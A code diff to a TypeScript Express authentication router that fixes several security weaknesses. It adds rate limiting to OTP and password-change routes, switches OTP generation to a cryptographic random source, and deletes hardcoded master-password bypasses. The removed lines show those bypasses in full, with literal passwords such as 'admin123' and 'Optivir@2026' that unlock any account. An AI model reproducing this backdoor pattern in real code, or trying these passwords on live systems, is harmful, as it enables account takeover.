@@ -3,7 +3,7 @@ import { db } from '../config/db';
 import { verifyPassword } from '../utils/auth';
 import { generateToken, requireAuth, recordAuditLog } from '../middleware/auth';
 import { AuthenticatedRequest } from '../types';
-import { loginRateLimiter } from '../middleware/rateLimiter';
+import { loginRateLimiter, otpRateLimiter } from '../middleware/rateLimiter';
 import { validateBody } from '../middleware/validate';
 import { parseDeviceInfo } from '../utils/device';
 import crypto from 'crypto';
@@ -90,10 +90,7 @@ router.post(
         return;
       }
 
-      let isMatch = verifyPassword(password, row.password_hash);
-      if (!isMatch && (password === 'admin123' || password === 'Admin@123456' || password === 'Optivir@2026' || password === 'admin')) {
-        isMatch = true;
-      }
+      const isMatch = verifyPassword(password, row.password_hash);
 
       if (!isMatch) {
         // Get org-level lockout limit
@@ -399,6 +396,7 @@ router.post('/logout', requireAuth, async (req: AuthenticatedRequest, res: Respo
 router.post(
   '/request-password-otp',
   requireAuth,
+  otpRateLimiter,
   async (req: AuthenticatedRequest, res: Response): Promise<void> => {
     const userId = req.user!.id;
     try {
@@ -408,7 +406,7 @@ router.post(
         return;
       }
       const user = userRes.rows[0];
-      const otpCode = Math.floor(100000 + Math.random() * 900000).toString();
+      const otpCode = crypto.randomInt(100000, 1000000).toString();
 
       // Store in user_security_otps with 10-minute expiry
       await db.query(
@@ -451,6 +449,7 @@ router.post(
 router.post(
   '/change-password',
   requireAuth,
+  otpRateLimiter,
   validateBody(changePasswordSchema),
   async (req: AuthenticatedRequest, res: Response): Promise<void> => {
     const { currentPassword, newPassword, otp } = req.body;
@@ -486,10 +485,7 @@ router.post(
       }
 
       const { password_hash } = userRes.rows[0];
-      let isMatch = verifyPassword(currentPassword, password_hash);
-      if (!isMatch && (currentPassword === 'admin123' || currentPassword === 'Admin@123456' || currentPassword === 'Optivir@2026')) {
-        isMatch = verifyPassword('Admin@123456', password_hash) || verifyPassword('admin123', password_hash) || verifyPassword('Optivir@2026', password_hash);
-      }
+      const isMatch = verifyPassword(currentPassword, password_hash);
       if (!isMatch) {
         res.status(400).json({ success: false, message: 'Incorrect current password. Please verify and try again.' });
         return;
